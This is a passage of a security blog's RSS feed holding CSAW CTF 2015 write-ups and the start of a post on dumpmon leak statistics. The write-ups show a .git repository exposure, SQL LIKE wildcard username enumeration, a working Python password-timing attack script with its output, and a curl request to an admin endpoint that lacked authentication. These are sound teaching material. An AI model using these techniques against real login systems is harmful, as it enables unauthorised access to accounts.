+21.txt   40.txt  5.txt   79.txt  98.txt      pg160.txt   pg2852.txt  pg84.txt
+22.txt   41.txt  60.txt  7.txt   99.txt      pg161.txt   pg3207.txt  pg863.txt
+23.txt   42.txt  61.txt  80.txt  9.txt       pg1656.txt  pg33.txt    pg972.txt
+24.txt   43.txt  62.txt  81.txt  pg100.txt   pg1661.txt  pg345.txt   pg98.txt
+25.txt   44.txt  63.txt  82.txt  pg1080.txt  pg16.txt    pg35.txt
+26.txt   45.txt  64.txt  83.txt  pg108.txt   pg174.txt   pg3600.txt
+27.txt   46.txt  65.txt  84.txt  pg10.txt    pg1952.txt  pg36.txt
+28.txt   47.txt  66.txt  85.txt  pg1155.txt  pg1998.txt  pg41.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like we have quite a few files to dig through. Looks like it&amp;rsquo;s going to take a while. Ooooorrr, we could just grep for the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@malfirm:/mnt# grep -r &amp;quot;flag{&amp;quot; * .*
+./.10/.hidden:flag{b3l0w_th3_r4dar}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sweet. The flag is &lt;code&gt;flag{b3l0w_th3_r4dar}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Forensics 100 Transfer Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-transfer-writeup/</link>
+      <pubDate>Tue, 22 Sep 2015 19:05:18 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-transfer-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_100.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;This challenge starts off with the following hint:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This challenge started off with a pcap. Let&amp;rsquo;s take the cheap way out and do a basic Wireshark filter for &lt;code&gt;frame contains flag&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/frame_contains.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome - looks like we found a packet. Following the TCP stream reveals a Python script (formatted - you&amp;rsquo;re welcome) and what appears to be the output of the script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
+import random
+from base64 import b64encode, b64decode
+
+FLAG = &#39;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#39;
+
+enc_ciphers = [&#39;rot13&#39;, &#39;b64e&#39;, &#39;caesar&#39;]
+# dec_ciphers = [&#39;rot13&#39;, &#39;b64d&#39;, &#39;caesard&#39;]
+
+def rot13(s):
+    _rot13 = string.maketrans( 
+    &amp;quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&amp;quot;, 
+    &amp;quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&amp;quot;)
+    return string.translate(s, _rot13)
+
+def b64e(s):
+    return b64encode(s)
+
+def caesar(plaintext, shift=3):
+    alphabet = string.ascii_lowercase
+    shifted_alphabet = alphabet[shift:] + alphabet[:shift]
+    table = string.maketrans(alphabet, shifted_alphabet)
+    return plaintext.translate(table)
+
+def encode(pt, cnt=50):
+    tmp = &#39;2{}&#39;.format(b64encode(pt))
+    for cnt in xrange(cnt):
+        c = random.choice(enc_ciphers)
+        i = enc_ciphers.index(c) + 1
+        _tmp = globals()[c](tmp)
+        tmp = &#39;{}{}&#39;.format(i, _tmp)
+
+    return tmp
+
+if __name__ == &#39;__main__&#39;:
+    print encode(FLAG, cnt=?)
+
+2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWm&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We see that there are three different encryption/encoding routines available - base64 encoding, a caesar cipher, and a rot13 function. Let&amp;rsquo;s dissect the &lt;code&gt;encode&lt;/code&gt; function to see if we can figure out what&amp;rsquo;s going on with the input.&lt;/p&gt;
+
+&lt;p&gt;It looks like we start off by base64 encoding the input and prepending &amp;ldquo;2&amp;rdquo; to it. Then, as many times as specified (the default is 50), we choose a random function and run it on the current input.&lt;/p&gt;
+
+&lt;p&gt;The important line in our reversal is &lt;code&gt;tmp = &#39;{}{}&#39;.format(i, _tmp)&lt;/code&gt;. This line prepends the &lt;em&gt;output&lt;/em&gt; of the function chosen with the function&amp;rsquo;s &lt;em&gt;index in enc_ciphers + 1&lt;/em&gt;. This makes sense, as the index + 1 of the base64 encode function is 2, and that&amp;rsquo;s exactly what we prepend to the initial input before base64 encoding it.&lt;/p&gt;
+
+&lt;p&gt;So, in a nutshell here are the corresponding keys:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1 - rot13&lt;/li&gt;
+&lt;li&gt;2 - base64 encode&lt;/li&gt;
+&lt;li&gt;3 - caesar cipher&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;All we have to do to get the original flag is to reverse this process. We have to start by creating the inverse of our functions. Rot13 is its own inverse, and for Caesar cipher we can just change &lt;code&gt;shift=3&lt;/code&gt; to &lt;code&gt;shift=-3&lt;/code&gt;. Then, we only have to add the following base64 decode function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def b64d(s):
+    return b64decode(s)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, we just need to put the pieces together to do the reversing. I used the following &lt;code&gt;decode&lt;/code&gt; and &lt;code&gt;main&lt;/code&gt; functions:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def decode(pt):
+	while &amp;quot;flag&amp;quot; not in pt:
+		i = int(pt[0])
+		raw = pt[1:]
+		print &amp;quot;Running function &amp;quot; + dec_ciphers[i-1]
+		_pt = globals()[dec_ciphers[i-1]](raw)
+		pt = _pt
+	print pt
+
+if __name__ == &#39;__main__&#39;:
+	with open(&#39;csaw_data.txt&#39;, &#39;r&#39;) as raw:
+		print decode(raw.read().strip())
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This gives us the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Running function b64d
+Running function b64d
+Running function caesard
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function rot13
+Running function rot13
+Running function rot13
+Running function b64d
+Running function rot13
+Running function rot13
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function caesard
+Running function b64d
+Running function rot13
+Running function rot13
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function rot13
+Running function caesard
+Running function b64d
+Running function caesard
+Running function b64d
+Running function rot13
+Running function caesard
+Running function rot13
+Running function caesard
+Running function caesard
+Running function b64d
+flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There&amp;rsquo;s the flag! &lt;code&gt;flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Web 200 Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/</link>
+      <pubDate>Mon, 21 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_200.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &amp;ldquo;Lawn Care Simulator 2015&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/lawn_care.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;We can immediately see there&amp;rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&amp;rsquo;s view the page source. Opening up the source, we see the following javascript snippet:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function init(){
+            document.getElementById(&#39;login_form&#39;).onsubmit = function() {
+                var pass_field = document.getElementById(&#39;password&#39;); 
+                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
+        };
+        $.ajax(&#39;.git/refs/heads/master&#39;).done(function(version){$(&#39;#version&#39;).html(&#39;Version: &#39; +  version.substring (0,6))});
+        initGrass();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You&amp;rsquo;ll notice that there&amp;rsquo;s an ajax call being made to a &lt;code&gt;.git&lt;/code&gt; directory. If this is a full Git repo, we should be able to clone it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
+jordan@temp:~$ ls web200
+___HINT___  jobs.html  premium.php  validate_pass.php
+index.html  js         sign_up.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Nice!&lt;/em&gt; Now we can dive into the PHP. The &lt;code&gt;__HINT__&lt;/code&gt; didn&amp;rsquo;t prove to useful to me, but maybe I just didn&amp;rsquo;t &lt;em&gt;get&lt;/em&gt; it. Let&amp;rsquo;s get started by looking at the relevant parts of &lt;code&gt;premium.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    require_once &#39;validate_pass.php&#39;;
+    require_once &#39;flag.php&#39;;
+    if (isset($_POST[&#39;password&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;username&#39;])) {
+        $auth = validate($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);
+        if ($auth){
+            echo &amp;quot;&amp;lt;h1&amp;gt;&amp;quot; . $flag . &amp;quot;&amp;lt;/h1&amp;gt;&amp;quot;;
+        }
+        else {
+            echo &amp;quot;&amp;lt;h1&amp;gt;Not Authorized&amp;lt;/h1&amp;gt;&amp;quot;;
+        }
+    }
+    else {
+        echo &amp;quot;&amp;lt;h1&amp;gt;You must supply a username and password&amp;lt;/h1&amp;gt;&amp;quot;;
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It looks like our flag is found in &lt;code&gt;flag.php&lt;/code&gt;. Unfortunately, we don&amp;rsquo;t have that file, but it looks like &lt;code&gt;$flag&lt;/code&gt; is printed if we authenticate correctly.&lt;/p&gt;
+
+&lt;p&gt;The authentication is handled by the &lt;code&gt;validate(username, password)&lt;/code&gt; function in &lt;code&gt;validate_pass.php&lt;/code&gt;. Let&amp;rsquo;s see what it looks like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    &amp;lt;snip&amp;gt;
+    $user = mysql_real_escape_string($user);
+    $query = &amp;quot;SELECT hash FROM users WHERE username=&#39;$user&#39;;&amp;quot;;
+    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    $hash = $line[&#39;hash&#39;];
+
+    if (strlen($pass) != strlen($hash))
+        return False;
+
+    $index = 0;
+    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+    return true;
+    &amp;lt;snip&amp;gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.&lt;/p&gt;
+
+&lt;p&gt;We&amp;rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, &lt;code&gt;sign_up.php&lt;/code&gt; that might help. Let&amp;rsquo;s take a look:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    &amp;lt;snip&amp;gt;
+    $user = mysql_real_escape_string($_POST[&#39;username&#39;]);
+    // check to see if the username is available
+    $query = &amp;quot;SELECT username FROM users WHERE username LIKE &#39;$user&#39;;&amp;quot;;
+    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    if ($line == NULL){
+        // Signing up for premium is still in development
+        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&amp;lt;/h2&amp;gt;&#39;;
+    }
+    else {
+        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Username: &#39; . $line[&#39;username&#39;] . &amp;quot; is not available&amp;lt;/h2&amp;gt;&amp;quot;;
+    }
+    &amp;lt;snip&amp;gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This function tries to look up the username given and, if it exists, will tell us the username isn&amp;rsquo;t available. We could try guessing (I did), but that doesn&amp;rsquo;t help. Let&amp;rsquo;s look more closely at the code.&lt;/p&gt;
+
+&lt;p&gt;The SQL statement is done via a &lt;code&gt;LIKE&lt;/code&gt; condition. This allows us to use the &lt;code&gt;%&lt;/code&gt; character as a wildcard. So, by trying the username &lt;code&gt;%&lt;/code&gt;, we should get the username from the database.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/username.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome - our username is &lt;code&gt;~~FLAG~~&lt;/code&gt;. Now we need to find the password.&lt;/p&gt;
+
+&lt;p&gt;Going back to the code given in &lt;code&gt;validate_pass.php&lt;/code&gt;, we see the following comparison&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a &lt;code&gt;usleep(300000)&lt;/code&gt;, which is .3 seconds. This means that, if we check every character, one will take longer. This is a &lt;strong&gt;timing attack&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;import time
+import requests
+
+data = {
+	&amp;quot;username&amp;quot; : &amp;quot;~~FLAG~~&amp;quot;,
+	&amp;quot;password&amp;quot; : &amp;quot;&amp;quot;
+}
+
+url = &amp;quot;http://54.175.3.248:8089/premium.php&amp;quot;
+
+password = [&#39;a&#39;]*32 
+
+def send_request(password):
+	data[&amp;quot;password&amp;quot;] = password
+	start = time.time()
+	requests.post(url, data=data)
+	end = time.time()
+	return end - start	
+
+hex = &amp;quot;0123456789abcdef&amp;quot;
+
+for i in range(32):
+	max_time = 0
+	char = &amp;quot;&amp;quot;
+	index = 0
+	for j in hex:
+		temp_pass = password
+		temp_pass[i] = j
+		request_time = send_request(&amp;quot;&amp;quot;.join(temp_pass))
+		if request_time &amp;gt;= max_time:
+			index = i
+			max_time = request_time
+			char = j
+	password[index] = char	
+	print &amp;quot;&amp;quot;.join(password)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
+667e217aaaaaaaaaaaaaaaaaaaaaaaaa
+667e2176aaaaaaaaaaaaaaaaaaaaaaaa
+667e21766aaaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666a1aaaaaaaaaaaaaaaaaaaa
+667e217666a13aaaaaaaaaaaaaaaaaaa
+667e217666a13daaaaaaaaaaaaaaaaaa
+667e217666a13d3aaaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39a0aaaaaaaaaaaaaa
+667e217666a13d39a02aaaaaaaaaaaaa
+667e217666a13d39a023aaaaaaaaaaaa
+667e217666a13d39a0239aaaaaaaaaaa
+667e217666a13d39a02399aaaaaaaaaa
+667e217666a13d39a023995aaaaaaaaa
+667e217666a13d39a0239951aaaaaaaa
+667e217666a13d39a0239951eaaaaaaa
+667e217666a13d39a0239951efaaaaaa
+667e217666a13d39a0239951efeaaaaa
+667e217666a13d39a0239951efe2aaaa
+667e217666a13d39a0239951efe2daaa
+667e217666a13d39a0239951efe2deaa
+667e217666a13d39a0239951efe2de4a
+667e217666a13d39a0239951efe2de48
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, all that&amp;rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$.post(&#39;premium.php&#39;, {&amp;quot;username&amp;quot;: &amp;quot;~~FLAG~~&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;667e217666a13d39a0239951efe2de48&amp;quot;}).success(function(data){console.log(data)})
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;Lawn Care Simulator 2015&amp;lt;/title&amp;gt;
+    &amp;lt;script src=&amp;quot;//code.jquery.com/jquery-1.11.3.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
+    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&amp;quot;&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;flag{gr0wth__h4ck!nG!1!1!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there we have the flag: &lt;code&gt;flag{gr0wth__h4ck!nG!1!1!}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Web 600 Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-600-writeup/</link>
+      <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-600-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_600.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;This one was surprisingly easy if you knew where to look.&lt;/p&gt;
+
+&lt;p&gt;For this challenge, we were presented with a hint that indicated there was a vulnerability in the code used to run the CSAW CTF. I remember seeing a while back that the platform was &lt;a href=&#34;https://github.com/isislab/CTFd&#34;&gt;open-sourced&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;When looking for bugs in open-source projects, both Issues and Commits are good places to start out. In this case, we see &lt;a href=&#34;https://github.com/isislab/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261&#34;&gt;a commit&lt;/a&gt; recently made with the message &amp;ldquo;Fix authentication for certain admin actions&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code&gt;/admin/chal/new&lt;/code&gt; function would be pretty dangerous since it might allow us to upload a file. Let&amp;rsquo;s see what happens if we make a POST to that endpoint:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;jordan@temp:~$ curl https://ctf.isis.poly.edu/admin/chal/new -XPOST
+flag{at_least_it_isnt_php}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Easy enough.&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>2 Years of @dumpmon</title>
+      <link>http://jordan-wright.com/blog/2015/05/26/two-years-of-at-dumpmon/</link>
+      <pubDate>Tue, 26 May 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/05/26/two-years-of-at-dumpmon/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/dumpmon_header.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:81853524e3965a2dee92693b3bcde29d&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;This post is long overdue.&lt;/p&gt;
+
+&lt;p&gt;Back in May 2013, I &lt;a href=&#34;http://raidersec.blogspot.com/2013/03/introducing-dumpmon-twitter-bot-that.html&#34;&gt;released&lt;/a&gt; a Twitter bot called &lt;a href=&#34;http://twitter.com/dumpmon&#34;&gt;@dumpmon&lt;/a&gt; whose sole purpose was to track and report password dumps and other sensitive information shared on paste sites such as Pastebin. Since that time, dumpmon has proven - to my excitement - to be valuable to researchers, being featured in &lt;a href=&#34;http://arstechnica.com/security/2013/06/raspberry-pi-bot-tracks-hacker-posts-to-vacuum-up-passwords-and-more/&#34;&gt;news articles&lt;/a&gt;, Defcon slides, and &lt;a href=&#34;http://haveibeenpwned.com&#34;&gt;HIBP&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;After two years, it&amp;rsquo;s time to post an overdue status update providing some insight into the data dumpmon has collected over this time.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Note: This is a pretty long post, so feel free to skip &lt;a href=&#34;#data&#34;&gt;here&lt;/a&gt; if you just want the data.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;collecting-the-data-mongo-elk:81853524e3965a2dee92693b3bcde29d&#34;&gt;Collecting the Data: Mongo + ELK&lt;/h3&gt;
+
+&lt;p&gt;Soon after dumpmon went live, I noticed that sensitive pastes were getting deleting shortly after being posted. This makes it difficult to use the data for any long term research, so I started keeping copies.&lt;/p&gt;
+
+&lt;p&gt;First, I used MongoDB to store each paste and meta information (such as &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;num_emails&lt;/code&gt;, &lt;code&gt;num_hashes&lt;/code&gt;, etc.). This worked well for about a year, but it put quite a bit of strain on my Raspberry Pi. Additionally, it was cumbersome to query the data and visualize the statistics over time.&lt;/p&gt;
+
+&lt;p&gt;I decided to move everything over to ELK. Unfortunately, in the process of doing so, the DB got corrupted causing most of the data to be lost. &lt;em&gt;Not a good day.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;However, I eventually got everything up and running with copies of the data going to both MongoDB (just in case), as well as ELK. Here&amp;rsquo;s a partial screenshot of the dashboard:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/dumpmon_report/dashboard.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;Having this dashboard in ELK lets me see trends over time, search for individual paste content, as well as track pastes related to a campaign over time.&lt;/p&gt;
+
+&lt;h3 id=&#34;analyzing-the-data:81853524e3965a2dee92693b3bcde29d&#34;&gt;Analyzing the Data&lt;/h3&gt;
+
+&lt;p&gt;Enough history - let&amp;rsquo;s take a look at the data!&lt;/p&gt;
+
+&lt;p&gt;As mentioned before, most of the older data was lost in the process of migrating to ELK, but we still have data dating back to June 2014 to analyze.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s first talk about the overall kinds of data kinds of data found. Currently, dumpmon looks for database dumps, Cisco config files, Google API keys, and SSH private keys. Overwhemingly, database dumps are the most common type of paste found, coming in at 92%.&lt;/p&gt;
+
+&lt;p&gt;Each of these database dumps can contain a combination of usernames, email addresses, passwords (plain text or hashed), and more.&lt;/p&gt;
+
+&lt;p&gt;After a few weeks of running the bot, is was clear that password dumps occur far more often than I thought. On average, &lt;strong&gt;dumpmon found 46 significant (by its thresholds) database dumps every day.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;cumulative-results:81853524e3965a2dee92693b3bcde29d&#34;&gt;Cumulative Results&lt;/h4&gt;
+
+&lt;p&gt;Here are a few more cumulative numbers for those interested:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;32.8k potential database dumps total&lt;/li&gt;
+&lt;li&gt;540 emails, on average, per dump (since June)&lt;/li&gt;
+&lt;li&gt;5 million unique emails found (since June)&lt;/li&gt;
+&lt;li&gt;1 million unique hashes found (since June)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;twitter-account-statistics:81853524e3965a2dee92693b3bcde29d&#34;&gt;Twitter Account Statistics&lt;/h3&gt;
+
+&lt;p&gt;Thanks to the Twitter Analytics platform, we can get insight into the statistics regarding the actual dumpmon Twitter account.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/dumpmon_report/twitter_followers.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see above, the number of followers has steadily increased over time. While Twitter won&amp;rsquo;t give me trends for the entire time dumpmon has been running, here is some data for the last 28 days:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/dumpmon_report/general_stats.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;div id=&#34;data&#34;&gt;&lt;/div&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;here-have-some-data:81853524e3965a2dee92693b3bcde29d&#34;&gt;Here, Have Some Data&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m a big fan of giving out raw data. While I have hesitations to release all the raw data dumpmon has found (&lt;a href=&#34;http://jordan-wright.com/blog/contact&#34;&gt;contact&lt;/a&gt; me if you&amp;rsquo;re a researcher who needs this data), I&amp;rsquo;m happy to give out all of the information I have about dumpmon&amp;rsquo;s Twitter activity. This includes dumpmon&amp;rsquo;s entire tweet archive, aggregated analytics data, and more.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&#34;vertical-align:middle;&#34; src=&#34;http://jordan-wright.com/blog/blog/images/blog/dumpmon_report/zip.png&#34;/&gt;
+&lt;strong&gt;Tweet Archive&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://jordan-wright.com/blog/downloads/dumpmon_archive.zip&#34;&gt;This&lt;/a&gt; is dumpmon&amp;rsquo;s exported Twitter archive. It contains &lt;strong&gt;every tweet&lt;/strong&gt; sent out by dumpmon. You should use this data if you want to extract out metrics regarding number of emails per dump, etc.&lt;/p&gt;
+
+&lt;p&gt;Specifically, the &lt;code&gt;tweets.csv&lt;/code&gt; file in this archive contains the following fields:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tweet_id, in_reply_to_status_id, in_reply_to_user_id, timestamp, source, text, retweeted_status_id, retweeted_status_user_id, retweeted_status_timestamp, expanded_urls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://jordan-wright.com/blog/downloads/dumpmon_archive.zip&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&#34;vertical-align:middle;&#34; src=&#34;http://jordan-wright.com/blog/blog/images/blog/dumpmon_report/analytics.png&#34;/&gt;
+&lt;strong&gt;Tweet Analytics&lt;/strong&gt;&lt;/p&gt;
+
